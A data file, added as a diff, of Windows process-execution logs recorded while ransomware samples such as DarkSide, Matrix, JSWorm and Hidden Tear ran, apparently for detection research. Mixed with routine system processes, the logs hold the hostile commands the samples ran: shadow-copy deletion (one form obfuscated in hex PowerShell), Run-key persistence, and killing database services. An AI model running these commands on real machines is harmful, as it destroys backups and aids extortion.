@@ -1,0 +1,692 @@
+0"."balaclava2"."2476"."3256"."632"."wermgr.exe"."C:\Windows\system32\wermgr.exe -upload
+0"."balaclava2"."3420"."8712"."8704"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 13
+0"."balaclava2"."4616"."3868"."7884"."powershell.exe"."powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+1"."balaclava3"."2468"."8004"."1628"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -pss -s 444 -p 4372 -ip 4372
+1"."balaclava3"."9204"."4628"."1628"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -pss -s 468 -p 4372 -ip 4372
+1"."balaclava3"."8528"."6592"."1628"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -pss -s 472 -p 4372 -ip 4372
+2"."balaclava5"."3368"."7828"."840"."UserOOBEBroker.exe"."C:\Windows\System32\oobe\UserOOBEBroker.exe -Embedding
+2"."balaclava5"."504"."7828"."840"."FileCoAuth.exe"."C:\Users\ejaz6\AppData\Local\Microsoft\OneDrive\20.169.0823.0008\FileCoAuth.exe -Embedding
+2"."balaclava5"."7800"."2216"."1640"."rundll32.exe"."rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh
+3"."balavlava1"."492"."9100"."2880"."cmd.exe".""C:\Windows\system32\cmd.exe"  /c del C:\Users\ejaz6\OneDrive\Desktop\balaclava\2f77160a6042797f0d17bef5bce95151fcb3c8cd61f43bfd22b1ab2420b3ccb8.exe > nul
+3"."balavlava1"."6160"."2408"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+3"."balavlava1"."3652"."7748"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+3"."balavlava1"."8236"."8216"."8228"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 13
+5"."crylock1"."7428"."4360"."4424"."mshta.exe".""C:\Windows\SysWOW64\mshta.exe" "C:\Users\ejaz6\AppData\Local\Temp\how_to_decrypt.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}
+6"."crylock2"."10896"."6772"."7104"."powershell.exe"."powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+7"."crylock3"."680"."1076"."840"."WmiPrvSE.exe"."C:\Windows\system32\wbem\wmiprvse.exe -Embedding
+7"."crylock3"."6932"."4964"."4644"."SearchProtocolHost.exe".""C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe3_ Global\UsGthrCtrlFltPipeMssGthrPipe3 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"
+7"."crylock3"."3908"."4964"."4644"."SearchFilterHost.exe".""C:\Windows\system32\SearchFilterHost.exe" 0 792 796 804 8192 800 776
+7"."crylock3"."6728"."1076"."840"."OpenWith.exe"."C:\Windows\system32\OpenWith.exe -Embedding
+7"."crylock3"."9196"."3168"."6728"."mshta.exe".""C:\Windows\SysWOW64\mshta.exe" "C:\Users\ejaz6\AppData\Local\Temp\how_to_decrypt.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}
+8"."crylock6"."3712"."8588"."840"."WmiPrvSE.exe"."C:\Windows\system32\wbem\wmiprvse.exe -Embedding
+8"."crylock6"."4052"."8588"."840"."OpenWith.exe"."C:\Windows\system32\OpenWith.exe -Embedding
+8"."crylock6"."1268"."4228"."4052"."mshta.exe".""C:\Windows\SysWOW64\mshta.exe" "C:\Users\ejaz6\AppData\Local\Temp\how_to_decrypt.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}
+8"."crylock6"."5816"."7916"."9064"."mshta.exe".""C:\Windows\SysWOW64\mshta.exe" "C:\Users\ejaz6\AppData\Local\Temp\how_to_decrypt.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}
+10"."darkside1"."9460"."9096"."632"."consent.exe"."consent.exe 632 298 0000027DD39FAD00
+10"."darkside1"."9508"."5380"."840"."dllhost.exe"."C:\Windows\SysWOW64\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+10"."darkside1"."5012"."6556"."9508"."9cee5522a7ca2bfca7cd3d9daba23e9a30deb6205f56c12045839075f7627297.exe".""C:\Users\ejaz6\OneDrive\Desktop\9cee5522a7ca2bfca7cd3d9daba23e9a30deb6205f56c12045839075f7627297.exe" 
+10"."darkside1"."9824"."9892"."5012"."powershell.exe"."powershell -ep bypass -c "(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex $s"
+10"."darkside1"."8420"."4152"."840"."BackgroundTransferHost.exe".""BackgroundTransferHost.exe" -ServerName:BackgroundTransferHost.1
+10"."darkside1"."396"."7948"."1148"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW
+10"."darkside1"."9744"."2932"."856"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:GeneralTel.dll -f:RunGeneralTelemetry  -cV pqbEtiAslkm4d6KO.1.3 -SendFullTelemetry -ThrottleUtc
+11"."darkside2"."2000"."3004"."632"."consent.exe"."consent.exe 632 306 0000027DD63854B0
+11"."darkside2"."6424"."1128"."840"."dllhost.exe"."C:\Windows\SysWOW64\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+11"."darkside2"."3404"."2844"."8900"."powershell.exe"."powershell -ep bypass -c "(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex $s"
+11"."darkside2"."9532"."5752"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k swprv
+11"."darkside2"."7696"."4964"."4644"."SearchFilterHost.exe".""C:\Windows\system32\SearchFilterHost.exe" 0 792 796 804 8192 800 776
+11"."darkside2"."8412"."6652"."840"."RuntimeBroker.exe"."C:\Windows\System32\RuntimeBroker.exe -Embedding
+11"."darkside2"."10184"."3004"."8412"."LocalBridge.exe".""C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_18.2008.12711.0_x64__8wekyb3d8bbwe\LocalBridge.exe" /InvokerPRAID: Microsoft.MicrosoftOfficeHub notifications
+12"."darkside3"."4864"."9968"."632"."consent.exe"."consent.exe 632 298 0000027DD39F85A0
+12"."darkside3"."9988"."7988"."840"."dllhost.exe"."C:\Windows\SysWOW64\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+12"."darkside3"."4656"."7024"."9988"."f42bcc81c05e8944649958f8b9296c5523d1eb8ab00842d66530702e476561ef.exe".""C:\Users\ejaz6\OneDrive\Desktop\f42bcc81c05e8944649958f8b9296c5523d1eb8ab00842d66530702e476561ef.exe" é
+12"."darkside3"."8780"."6048"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k WerSvcGroup
+12"."darkside3"."3156"."8480"."8780"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -pss -s 420 -p 3368 -ip 3368
+12"."darkside3"."4772"."3412"."4656"."powershell.exe"."powershell -ep bypass -c "(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex $s"
+12"."darkside3"."1756"."8480"."3368"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -u -p 3368 -s 924
+12"."darkside3"."8336"."6048"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k swprv
+12"."darkside3"."5784"."4964"."4644"."SearchFilterHost.exe".""C:\Windows\system32\SearchFilterHost.exe" 0 792 796 804 8192 800 776
+12"."darkside3"."400"."4964"."4644"."SearchProtocolHost.exe".""C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe10_ Global\UsGthrCtrlFltPipeMssGthrPipe10 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"
+13"."darkside4"."3456"."9096"."632"."consent.exe"."consent.exe 632 342 0000027DD844BA50
+13"."darkside4"."3376"."2236"."840"."dllhost.exe"."C:\Windows\SysWOW64\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+13"."darkside4"."9580"."8400"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k smphost
+13"."darkside4"."2080"."6012"."4424"."DismHost.exe"."C:\Windows\TEMP\9F0587CB-EDF2-4A63-877A-1E244A343A74\dismhost.exe {BB51FD04-6545-46D7-AACF-C2528DABA34E}
+14"."hiddentear1"."9884"."5264"."9120"."cmd.exe".""cmd" /C vssadmin Delete Shadows /All /Quiet
+14"."hiddentear1"."2080"."5392"."9884"."vssadmin.exe"."vssadmin  Delete Shadows /All /Quiet
+14"."hiddentear1"."6820"."6232"."7316"."rundll32.exe"."rundll32 C:\Windows\system32\GeneralTel.dll,RunInUserCxt V/cFaprb8kOaft5O.1.1.2 {36E1225E-19C0-4867-B7DE-BE2FC0B44DA2} {9751E73F-FB21-EF33-47B6-1E1E1E47DF8F} IsAdmin WAMAccountCount
+14"."hiddentear1"."7532"."3200"."3668"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+14"."hiddentear1"."3768"."4380"."632"."consent.exe"."consent.exe 632 316 0000027DD4C07130
+14"."hiddentear1"."9868"."1728"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+14"."hiddentear1"."2904"."10084"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k NetworkService -p
+14"."hiddentear1"."10044"."4764"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}
+14"."hiddentear1"."9512"."9920"."9900"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+14"."hiddentear1"."5024"."10224"."280"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+14"."hiddentear1"."7524"."9992"."4364"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+14"."hiddentear1"."4352"."1752"."668"."wuauclt.exe".""C:\Windows\system32\wuauclt.exe" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 90e11da7-7ff7-4efa-9242-d80eccaec022 /RunHandlerComServer
+14"."hiddentear1"."9312"."3432"."4352"."AM_Delta.exe".""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe" WD /q
+14"."hiddentear1"."2656"."4012"."9312"."MpSigStub.exe"."C:\Windows\system32\MpSigStub.exe /stub 1.1.17640.0 /payload 1.327.2026.0 /MpWUStub /program C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe WD /q
+15"."hiddentear2"."684"."7844"."7308"."cmd.exe".""cmd" /C vssadmin Delete Shadows /All /Quiet
+15"."hiddentear2"."8956"."4004"."684"."vssadmin.exe"."vssadmin  Delete Shadows /All /Quiet
+15"."hiddentear2"."8764"."4016"."840"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
+15"."hiddentear2"."3228"."1356"."840"."SecHealthUI.exe".""C:\Windows\SystemApps\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\SecHealthUI.exe" -ServerName:SecHealthUI.AppXep4x2tbtjws1v9qqs0rmb3hxykvkpqtn.mca
+15"."hiddentear2"."2848"."2788"."840"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {E041C90B-68BA-42C9-991E-477B73A75C90} -Embedding
+15"."hiddentear2"."2040"."4016"."840"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
+16"."jsworm"."7308"."7972"."3668"."1B33D9295F9B190F4ED0E3931421D24620FE25C070EC5F340B12AEA204EE9753.exe".""C:\Users\ejaz6\OneDrive\Desktop\samples for testing\1B33D9295F9B190F4ED0E3931421D24620FE25C070EC5F340B12AEA204EE9753.exe"
+16"."jsworm"."6196"."7952"."6556"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -pss -s 540 -p 7308 -ip 7308
+16"."jsworm"."9112"."7952"."7308"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -u -p 7308 -s 468
+16"."jsworm"."5504"."3820"."3668"."1B51D701D44803130515313E67ABD02ACC4E56C527A1C1571B6B497A935C6BF2.exe".""C:\Users\ejaz6\OneDrive\Desktop\samples for testing\1B51D701D44803130515313E67ABD02ACC4E56C527A1C1571B6B497A935C6BF2.exe"
+16"."jsworm"."6088"."7952"."6556"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -pss -s 608 -p 5504 -ip 5504
+16"."jsworm"."7268"."7952"."5504"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -u -p 5504 -s 476
+16"."jsworm"."1708"."6780"."3668"."1B69CB224D962354F5E8F8BC1B1EC6D1E6A0EB15806CE8592B293C02613ECCE1.exe".""C:\Users\ejaz6\OneDrive\Desktop\samples for testing\1B69CB224D962354F5E8F8BC1B1EC6D1E6A0EB15806CE8592B293C02613ECCE1.exe"
+16"."jsworm"."6664"."7952"."6556"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -pss -s 444 -p 1708 -ip 1708
+16"."jsworm"."5580"."7952"."1708"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -u -p 1708 -s 444
+16"."jsworm"."5372"."7144"."3668"."1B82C41572BB2E9DD7B010732A2E6655D41AB9A0F917339FF19CAE349358CEB1.exe".""C:\Users\ejaz6\OneDrive\Desktop\samples for testing\1B82C41572BB2E9DD7B010732A2E6655D41AB9A0F917339FF19CAE349358CEB1.exe"
+16"."jsworm"."9144"."7952"."6556"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -pss -s 420 -p 5372 -ip 5372
+16"."jsworm"."7500"."7952"."5372"."WerFault.exe"."C:\Windows\SysWOW64\WerFault.exe -u -p 5372 -s 464
+16"."jsworm"."9196"."804"."3668"."1B871A34C25DD253B563A5C52D054A9DD79F462E047908B6E8F523FF0732AB97.exe".""C:\Users\ejaz6\OneDrive\Desktop\samples for testing\1B871A34C25DD253B563A5C52D054A9DD79F462E047908B6E8F523FF0732AB97.exe"
+16"."jsworm"."8896"."5180"."9196"."cmd.exe".""C:\Windows\System32\cmd.exe"  /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "zapiska" /d "C:\Users\ejaz6\JSWRM-DECRYPT.hta"
+16"."jsworm"."1884"."5180"."9196"."cmd.exe".""C:\Windows\System32\cmd.exe"  /c reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "zapiska" /d "C:\Users\ejaz6\JSWRM-DECRYPT.hta"
+16"."jsworm"."7488"."5180"."9196"."cmd.exe".""C:\Windows\System32\cmd.exe"  /c taskkill.exe taskkill /f /im store.exe
+16"."jsworm"."152"."5180"."9196"."cmd.exe".""C:\Windows\System32\cmd.exe"  /c taskkill.exe taskkill /f /im sqlserver.exe
+16"."jsworm"."8712"."7200"."8896"."reg.exe"."reg  add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "zapiska" /d "C:\Users\ejaz6\JSWRM-DECRYPT.hta"
+16"."jsworm"."8616"."7568"."1884"."reg.exe"."reg  add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "zapiska" /d "C:\Users\ejaz6\JSWRM-DECRYPT.hta"
+16"."jsworm"."6408"."5180"."9196"."cmd.exe".""C:\Windows\System32\cmd.exe"  /c taskkill.exe taskkill /f /im dns.exe
+16"."jsworm"."4284"."5180"."9196"."cmd.exe".""C:\Windows\System32\cmd.exe"  /c taskkill.exe taskkill /f /im sqlwriter.exe
+16"."jsworm"."7024"."6120"."7488"."taskkill.exe"."taskkill.exe  taskkill /f /im store.exe
+16"."jsworm"."4412"."6200"."6408"."taskkill.exe"."taskkill.exe  taskkill /f /im dns.exe
+16"."jsworm"."2508"."7340"."152"."taskkill.exe"."taskkill.exe  taskkill /f /im sqlserver.exe
+16"."jsworm"."6460"."5392"."4284"."taskkill.exe"."taskkill.exe  taskkill /f /im sqlwriter.exe
+16"."jsworm"."9204"."7828"."840"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
+16"."jsworm"."7696"."4728"."840"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {E041C90B-68BA-42C9-991E-477B73A75C90} -Embedding
+17"."matrix1"."9004"."4348"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+17"."matrix1"."772"."3788"."840"."RuntimeBroker.exe"."C:\Windows\System32\RuntimeBroker.exe -Embedding
+17"."matrix1"."6756"."416"."7320"."rundll32.exe"."rundll32 C:\Windows\system32\GeneralTel.dll,RunInUserCxt CQCqAK1Xe0ORGFhk.1.2.2 {FD3AD094-7512-4C7E-91C1-B9BFFD6A9338} {9751E73F-FB21-EF33-47B6-1E1E1E47DF8F} IsAdmin WAMAccountCount
+17"."matrix1"."3588"."3952"."6768"."cmd.exe".""C:\Windows\system32\cmd.exe" /C copy /V /Y "C:\Users\ejaz6\OneDrive\Desktop\matrix\095721924420baff3670898412fc911ff32540544e8fad5495d334cded931270.exe" "C:\Users\ejaz6\OneDrive\Desktop\matrix\NWGABViH.exe"
+17"."matrix1"."828"."3952"."6768"."NWGABViH.exe".""C:\Users\ejaz6\OneDrive\Desktop\matrix\NWGABViH.exe" -n
+17"."matrix1"."8532"."1796"."1148"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW
+17"."matrix1"."7460"."5448"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k WerSvcGroup
+17"."matrix1"."4408"."3600"."632"."wermgr.exe"."C:\Windows\system32\wermgr.exe -upload
+17"."matrix1"."2500"."1988"."1640"."rundll32.exe"."rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh
+17"."matrix1"."1708"."3952"."6768"."cmd.exe".""C:\Windows\system32\cmd.exe" /C reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\ejaz6\AppData\Roaming\fUeVRnb8.bmp" /f & reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "0" /f & reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d "0" /f
+17"."matrix1"."8680"."7940"."1708"."reg.exe"."reg  add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\ejaz6\AppData\Roaming\fUeVRnb8.bmp" /f
+17"."matrix1"."8720"."7940"."1708"."reg.exe"."reg  add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "0" /f
+17"."matrix1"."8612"."7940"."1708"."reg.exe"."reg  add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d "0" /f
+17"."matrix1"."7464"."4964"."4644"."SearchFilterHost.exe".""C:\Windows\system32\SearchFilterHost.exe" 0 792 796 804 8192 800 776
+17"."matrix1"."7636"."7580"."7016"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 13
+17"."matrix1"."6948"."1988"."1640"."rundll32.exe"."rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh
+18"."matrix2"."7640"."7748"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+18"."matrix2"."5576"."1724"."6256"."cmd.exe".""C:\Windows\system32\cmd.exe" /C reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\ejaz6\AppData\Roaming\Uzl2TmzW.bmp" /f & reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "0" /f & reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d "0" /f
+18"."matrix2"."4968"."8904"."5576"."reg.exe"."reg  add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\ejaz6\AppData\Roaming\Uzl2TmzW.bmp" /f
+18"."matrix2"."3060"."7140"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+18"."matrix2"."3024"."7456"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+18"."matrix2"."4880"."5976"."632"."dmclient.exe"."C:\Windows\system32\dmclient.exe utcwnf
+18"."matrix2"."7716"."4964"."4644"."SearchFilterHost.exe".""C:\Windows\system32\SearchFilterHost.exe" 0 792 796 804 8192 800 776
+19"."matrix3"."8472"."7444"."6504"."cmd.exe".""C:\Windows\system32\cmd.exe" /C copy /V /Y "C:\Users\ejaz6\OneDrive\Desktop\matrix\7b5e536827c3bb9f8077aed78726585739bcde796904edd6c4faadc9a8d22eaf.exe" "C:\Users\ejaz6\OneDrive\Desktop\matrix\NWCgFZAz.exe"
+19"."matrix3"."7512"."7444"."6504"."NWCgFZAz.exe".""C:\Users\ejaz6\OneDrive\Desktop\matrix\NWCgFZAz.exe" -n
+19"."matrix3"."6544"."5964"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+19"."matrix3"."8664"."2508"."4280"."MusNotificationUx.exe"."%systemroot%\system32\MusNotificationUx.exe ClearActiveNotifications
+19"."matrix3"."5276"."3448"."632"."wermgr.exe"."C:\Windows\system32\wermgr.exe -upload
+19"."matrix3"."8892"."2508"."4280"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 13
+19"."matrix3"."3828"."7444"."6504"."cmd.exe".""C:\Windows\system32\cmd.exe" /C reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\ejaz6\AppData\Roaming\8RgWmujg.bmp" /f & reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "0" /f & reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d "0" /f
+19"."matrix3"."3536"."6708"."3828"."reg.exe"."reg  add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\ejaz6\AppData\Roaming\8RgWmujg.bmp" /f
+19"."matrix3"."4236"."6708"."3828"."reg.exe"."reg  add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "0" /f
+19"."matrix3"."5444"."6708"."3828"."reg.exe"."reg  add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d "0" /f
+19"."matrix3"."768"."7748"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+20"."matrix4"."9020"."6240"."7660"."cmd.exe".""C:\Windows\system32\cmd.exe" /C copy /V /Y "C:\Users\ejaz6\OneDrive\Desktop\matrix\d87d1fbeffe5b18e22f288780bf50b1e7d5af9bbe2480c80ea2a7497a3d52829.exe" "C:\Users\ejaz6\OneDrive\Desktop\matrix\NWJPqHPo.exe"
+20"."matrix4"."5468"."6240"."7660"."NWJPqHPo.exe".""C:\Users\ejaz6\OneDrive\Desktop\matrix\NWJPqHPo.exe" -n
+20"."matrix4"."6212"."8044"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+20"."matrix4"."7280"."6240"."7660"."cmd.exe".""C:\Windows\system32\cmd.exe" /C reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\ejaz6\AppData\Roaming\hmZs4Ljh.bmp" /f & reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "0" /f & reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d "0" /f
+20"."matrix4"."3792"."4684"."7280"."reg.exe"."reg  add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\ejaz6\AppData\Roaming\hmZs4Ljh.bmp" /f
+20"."matrix4"."4416"."4684"."7280"."reg.exe"."reg  add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "0" /f
+20"."matrix4"."9000"."4684"."7280"."reg.exe"."reg  add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d "0" /f
+20"."matrix4"."6256"."6208"."840"."TiWorker.exe"."C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.441_none_e753a4f1261e4901\TiWorker.exe -Embedding
+20"."matrix4"."4736"."8344"."1528"."MpSigStub.exe".""C:\Windows\SoftwareDistribution\Download\Install\MpSigStub.exe" /Store
+20"."matrix4"."2468"."8848"."632"."dmclient.exe"."C:\Windows\system32\dmclient.exe utcwnf
+21"."Maze"."5436"."6328"."4472"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:GeneralTel.dll -f:RunGeneralTelemetry  -cV VzjGPwWv8E28SDIv.1.3 -SendFullTelemetry -ThrottleUtc
+21"."Maze"."9700"."6764"."1148"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW
+21"."Maze"."9908"."6192"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+21"."Maze"."3496"."3504"."5436"."rundll32.exe"."rundll32 C:\Windows\system32\GeneralTel.dll,RunInUserCxt VzjGPwWv8E28SDIv.1.3.2 {107A7CAF-527B-40E0-80C4-45C44C24EBD7} {9751E73F-FB21-EF33-47B6-1E1E1E47DF8F} IsAdmin WAMAccountCount
+21"."Maze"."10092"."7988"."840"."RuntimeBroker.exe"."C:\Windows\System32\RuntimeBroker.exe -Embedding
+21"."Maze"."5168"."7964"."840"."SearchApp.exe".""C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca
+21"."Maze"."2492"."7964"."840"."backgroundTaskHost.exe".""C:\Windows\system32\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider
+21"."Maze"."9564"."9056"."840"."RuntimeBroker.exe"."C:\Windows\System32\RuntimeBroker.exe -Embedding
+22"."mesiponsi3"."2056"."9764"."9648"."OneDrive.exe"." /updateInstalled /background
+22"."mesiponsi3"."7444"."2788"."840"."RuntimeBroker.exe"."C:\Windows\System32\RuntimeBroker.exe -Embedding
+22"."mesiponsi3"."9964"."5276"."1148"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW
+23"."mesiponza2"."9468"."9056"."840"."RuntimeBroker.exe"."C:\Windows\System32\RuntimeBroker.exe -Embedding
+23"."mesiponza2"."10140"."9056"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{AA65DD7C-83AC-48C0-A6FD-9B61FEBF8800}
+23"."mesiponza2"."9368"."9056"."840"."RuntimeBroker.exe"."C:\Windows\System32\RuntimeBroker.exe -Embedding
+23"."mesiponza2"."6500"."2236"."840"."BackgroundTransferHost.exe".""BackgroundTransferHost.exe" -ServerName:BackgroundTransferHost.1
+23"."mesiponza2"."10096"."7988"."840"."RuntimeBroker.exe"."C:\Windows\System32\RuntimeBroker.exe -Embedding
+23"."mesiponza2"."10104"."4780"."1148"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW
+24"."mesiponza5"."9808"."4780"."1148"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW
+24"."mesiponza5"."7172"."10000"."9996"."rundll32.exe"."rundll32 C:\Windows\system32\GeneralTel.dll,RunInUserCxt BQ5wHR98KUWNlKDZ.1.3.2 {F7CA023E-3BBF-4004-B12F-DBDBCB7CDACF} {9751E73F-FB21-EF33-47B6-1E1E1E47DF8F} IsAdmin WAMAccountCount
+24"."mesiponza5"."4632"."7988"."840"."backgroundTaskHost.exe".""C:\Windows\system32\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider
+24"."mesiponza5"."9160"."2236"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+24"."mesiponza5"."9504"."3200"."3668"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
